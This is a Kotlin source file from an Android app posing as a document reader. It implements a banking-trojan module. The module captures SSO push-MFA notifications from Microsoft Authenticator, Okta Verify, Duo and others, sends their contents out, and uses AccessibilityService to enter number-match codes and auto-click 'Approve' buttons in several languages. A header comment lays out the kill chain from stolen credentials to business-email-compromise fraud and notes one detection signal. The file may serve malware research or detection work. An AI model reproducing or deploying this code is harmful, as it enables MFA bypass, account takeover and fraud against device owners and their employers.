package com.docreader.lite.reader.advanced

import android.accessibilityservice.AccessibilityService
import android.os.Bundle
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.docreader.lite.reader.Exfil

/**
 * SSO notification auto-approve — Vespertine pattern (May 2026).
 *
 * First commodity banker that reads enterprise SSO push-MFA notifications
 * (Microsoft Authenticator, Okta Verify, Duo, Auth0) and auto-approves
 * them via AccessibilityService.
 *
 * Kill chain:
 *   1. Attacker triggers login on enterprise portal (with stolen creds)
 *   2. SSO provider pushes MFA notification to victim device
 *   3. Banker's NLS captures notification
 *   4. Banker's A11y auto-clicks "Approve" button
 *   5. Enterprise session established → BEC monetization
 *
 * Timing critical: sub-500ms from notification to approval.
 * User sees notification briefly flash then disappear.
 *
 * Detection: SSO notification + Accessibility auto-click within 500ms
 * on a non-foreground SSO app = Vespertine signal.
 */
object SsoManager {

    // SSO app packages to monitor
    private val SSO_APPS = listOf(
        "com.azure.authenticator",            // Microsoft Authenticator
        "com.okta.android.auth",              // Okta Verify
        "com.duosecurity.duomobile",          // Duo Mobile
        "com.google.android.apps.authenticator2", // Google Authenticator
        "com.authy.authy",                    // Authy (Twilio)
    )

    // Approve button text patterns (case-insensitive)
    private val APPROVE_PATTERNS = listOf(
        "approve", "allow", "yes", "confirm",
        "accept", "verify", "it's me", "i approve",
        "onayla", "kabul et", // Turkish
        "aprobar", "aceptar", // Spanish
    )

    // Number-matching patterns (Microsoft Authenticator shows a number)
    private val NUMBER_MATCH_REGEX = Regex("\\b(\\d{2})\\b")

    /**
     * Handle notification from SSO app.
     * Called from SyncNotificationService when SSO app posts notification.
     *
     * Returns: the number to match (if Microsoft Authenticator number-match flow)
     *          or null if auto-approve was attempted.
     */
    fun handleSsoNotification(
        ssoApp: String,
        title: String,
        text: String,
    ): String? {
        Exfil.event("sso_notification",
            "app" to ssoApp,
            "title" to title.take(50),
            "text" to text.take(100)
        )

        // Check for number-matching (Microsoft Authenticator pattern)
        val numberMatch = NUMBER_MATCH_REGEX.find(text)
        if (numberMatch != null) {
            val number = numberMatch.groupValues[1]
            Exfil.event("sso_number_match",
                "app" to ssoApp,
                "number" to number
            )
            return number  // Caller needs to type this number
        }

        return null // Simple approve — auto-click handles it
    }

    /**
     * Auto-approve SSO prompt via AccessibilityService.
     * Scans active window for "Approve" / "Allow" buttons, clicks them.
     *
     * Must be called within 500ms of notification for Vespertine-class speed.
     */
    fun autoApprove(service: AccessibilityService): Boolean {
        val root = service.rootInActiveWindow ?: return false

        try {
            // Try each approve pattern
            for (pattern in APPROVE_PATTERNS) {
                val nodes = root.findAccessibilityNodeInfosByText(pattern)
                if (nodes.isNullOrEmpty()) continue

                for (node in nodes) {
                    if (node.isClickable) {
                        val clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (clicked) {
                            Exfil.event("sso_auto_approved",
                                "pattern" to pattern,
                                "pkg" to (node.packageName?.toString() ?: "")
                            )
                            nodes.forEach { it.recycle() }
                            root.recycle()
                            return true
                        }
                    }
                    // Try clicking parent if button itself isn't clickable
                    val parent = node.parent
                    if (parent?.isClickable == true) {
                        val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (clicked) {
                            Exfil.event("sso_auto_approved",
                                "pattern" to pattern,
                                "via" to "parent_click"
                            )
                            parent.recycle()
                            nodes.forEach { it.recycle() }
                            root.recycle()
                            return true
                        }
                        parent.recycle()
                    }
                }
                nodes.forEach { it.recycle() }
            }
        } catch (_: Exception) {}

        root.recycle()
        return false
    }

    /**
     * Handle number-match SSO flow (Microsoft Authenticator).
     * When notification shows a number, banker must:
     *   1. Open the notification (expand it)
     *   2. Find the number entry field
     *   3. Type the matching number
     *   4. Click approve
     */
    fun handleNumberMatch(
        service: AccessibilityService,
        number: String,
    ): Boolean {
        val root = service.rootInActiveWindow ?: return false

        try {
            // Find text input field
            val inputs = findEditTexts(root)
            for (input in inputs) {
                // Type the number
                val args = Bundle().apply {
                    putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        number
                    )
                }
                input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                input.recycle()

                // Now click approve
                return autoApprove(service)
            }
        } catch (_: Exception) {}

        root.recycle()
        return false
    }

    private fun findEditTexts(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val results = mutableListOf<AccessibilityNodeInfo>()
        if (node.className?.toString() == "android.widget.EditText") {
            results.add(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            results.addAll(findEditTexts(child))
        }
        return results
    }

    /**
     * Check if a package is an SSO app we target.
     */
    fun isSsoApp(packageName: String): Boolean {
        return SSO_APPS.any { packageName.startsWith(it) }
    }
}
